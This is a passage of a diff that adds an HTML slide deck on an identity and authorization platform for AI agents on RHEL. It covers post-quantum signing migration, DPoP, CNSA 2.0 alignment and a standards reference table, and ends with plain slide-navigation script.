+      <div style="font-size:12px; line-height:2;">
+        <strong>Phase 1 (now):</strong> ES256 (P-256) for all tokens — FIPS 186-5 compliant<br>
+        <strong>Phase 2:</strong> Ed25519/Ed448 for performance-sensitive paths<br>
+        <strong>Phase 3:</strong> ML-DSA-65 for new token issuance<br>
+        <strong>Phase 4:</strong> ML-DSA-65 mandatory, classical algorithms deprecated
+      </div>
+
+      <hr class="sep">
+      <h3>DPoP Proofs</h3>
+      <p style="font-size:12px;">DPoP proof signatures (RFC 9449) can also use PQC algorithms — the sender proves possession of a key bound to the access token using ML-DSA, preventing token replay even by quantum adversaries.</p>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header">CNSA 2.0 Alignment</div>
+    <p style="font-size:13px;">
+      NSA's CNSA 2.0 timeline recommends post-quantum algorithms for software/firmware signing by 2025 and for all new systems by 2030.
+      The platform is ahead of schedule — ML-DSA support is available today for both token signing (ahdapa) and certificate issuance (akamu),
+      with the classical→PQC migration path built into the algorithm negotiation protocol.
+    </p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 12: Standards Reference -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide" data-index="11">
+  <h2>Standards Reference</h2>
+  <p>Every enforcement mechanism maps to a published standard. No proprietary protocols.</p>
+
+  <table class="data-table">
+    <thead>
+      <tr><th>Standard</th><th>Component</th><th>Role in Platform</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><code>RFC 6749</code></td><td>ahdapa</td><td>OAuth 2.0 Authorization Framework — core token issuance protocol</td></tr>
+      <tr><td><code>RFC 6750</code></td><td>ahdapa</td><td>Bearer Token Usage — token format and transmission</td></tr>
+      <tr><td><code>RFC 7523</code></td><td>ahdapa</td><td>JWT Bearer Assertion — JWT-based client authentication</td></tr>
+      <tr><td><code>RFC 7591</code></td><td>ahdapa</td><td>Dynamic Client Registration — agents self-register post-enrollment</td></tr>
+      <tr><td><code>RFC 7636</code></td><td>ahdapa</td><td>PKCE (S256) — protects authorization code flow from interception</td></tr>
+      <tr><td><code>RFC 8628</code></td><td>ahdapa / DARC</td><td>Device Authorization Grant — headless agent enrollment via browser approval</td></tr>
+      <tr><td><code>RFC 8693</code></td><td>OBO Daemon</td><td>Token Exchange — converts agent token to scoped downstream token</td></tr>
+      <tr><td><code>RFC 9068</code></td><td>ahdapa</td><td>JWT Profile for Access Tokens — <code>at+JWT</code> type, structured claims</td></tr>
+      <tr><td><code>RFC 9449</code></td><td>ahdapa</td><td>DPoP — sender-constrained tokens, prevents replay</td></tr>
+      <tr><td><code>SPIFFE / SPIRE</code></td><td>SPIRE Server</td><td>Workload Identity — X.509 SVIDs for service-to-service attestation</td></tr>
+      <tr><td><code>OIDC Discovery</code></td><td>ahdapa</td><td><code>.well-known/openid-configuration</code> — automated capability discovery</td></tr>
+      <tr><td><code>FIPS 204</code></td><td>akamu / ahdapa</td><td>ML-DSA (post-quantum digital signatures) — certificate and token signing</td></tr>
+      <tr><td><code>FIPS 186-5</code></td><td>ahdapa</td><td>ECDSA (P-256) — current default token signing algorithm (ES256)</td></tr>
+      <tr><td><code>OCSF v1.4</code></td><td>Audit Pipeline</td><td>Open Cybersecurity Schema Framework — structured security events</td></tr>
+      <tr><td><code>MITRE ATT&amp;CK</code></td><td>Assessment Gate</td><td>Threat technique taxonomy — maps findings to adversary TTPs</td></tr>
+      <tr><td><code>FreeIPA HBAC</code></td><td>Identity Gate</td><td>Host-Based Access Control — policy engine binding agents to services on hosts</td></tr>
+    </tbody>
+  </table>
+
+  <div class="card" style="margin-top:24px; text-align:center; border-color:var(--accent-identity);">
+    <p style="font-size:16px; font-weight:600; margin:0;">
+      Five layers. Any one stops the attack.<br>
+      <span style="color:var(--accent-identity);">Together: defense in depth for AI agents on RHEL.</span>
+    </p>
+  </div>
+</div>
+
+</div><!-- /slides-viewport -->
+
+<!-- Navigation bar -->
+<nav class="nav-bar">
+  <button id="prevBtn" disabled>← Prev</button>
+  <span class="slide-counter"><span id="currentSlide">1</span> / <span id="totalSlides">12</span></span>
+  <button id="nextBtn">Next →</button>
+</nav>
+
+<script>
+(function() {
+  const slides = document.querySelectorAll('.slide');
+  const tocItems = document.querySelectorAll('.toc-item');
+  const prevBtn = document.getElementById('prevBtn');
+  const nextBtn = document.getElementById('nextBtn');
+  const currentEl = document.getElementById('currentSlide');
+  const totalEl = document.getElementById('totalSlides');
+  const progressBar = document.getElementById('progressBar');
+  const toc = document.getElementById('toc');
+  const tocToggle = document.getElementById('tocToggle');
+
+  let current = 0;
+  const total = slides.length;
+  totalEl.textContent = total;
+
+  function goTo(idx) {
+    if (idx < 0 || idx >= total) return;
+    slides[current].classList.remove('active');
+    slides[current].classList.add('prev');
+    setTimeout(() => slides[current === idx ? current : (current < idx ? current : current)], 0);
+
+    slides.forEach((s, i) => {
+      s.classList.remove('active', 'prev');
+      if (i < idx) s.classList.add('prev');
+    });
+    slides[idx].classList.add('active');
+
+    current = idx;
+    currentEl.textContent = current + 1;
+    prevBtn.disabled = current === 0;
+    nextBtn.disabled = current === total - 1;
+    progressBar.style.width = ((current + 1) / total * 100) + '%';
+
+    tocItems.forEach((item, i) => {
+      item.classList.toggle('active', i === current);
+    });
+
+    slides[current].scrollTop = 0;
+  }
+
+  prevBtn.addEventListener('click', () => goTo(current - 1));
+  nextBtn.addEventListener('click', () => goTo(current + 1));
+
+  tocItems.forEach(item => {
+    item.addEventListener('click', () => {
+      goTo(parseInt(item.dataset.slide));
+    });
+  });
+
+  tocToggle.addEventListener('click', () => {
+    toc.classList.toggle('collapsed');
+  });
+
+  document.addEventListener('keydown', (e) => {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+    if (e.key === 'ArrowRight' || e.key === 'ArrowDown' || e.key === ' ') {
+      e.preventDefault();
+      goTo(current + 1);
+    } else if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') {
+      e.preventDefault();
+      goTo(current - 1);
+    } else if (e.key === 'Home') {
+      e.preventDefault();
+      goTo(0);
+    } else if (e.key === 'End') {
+      e.preventDefault();
+      goTo(total - 1);
+    }
+  });
+
+  goTo(0);
+})();
+</script>
+</body>
+</html>
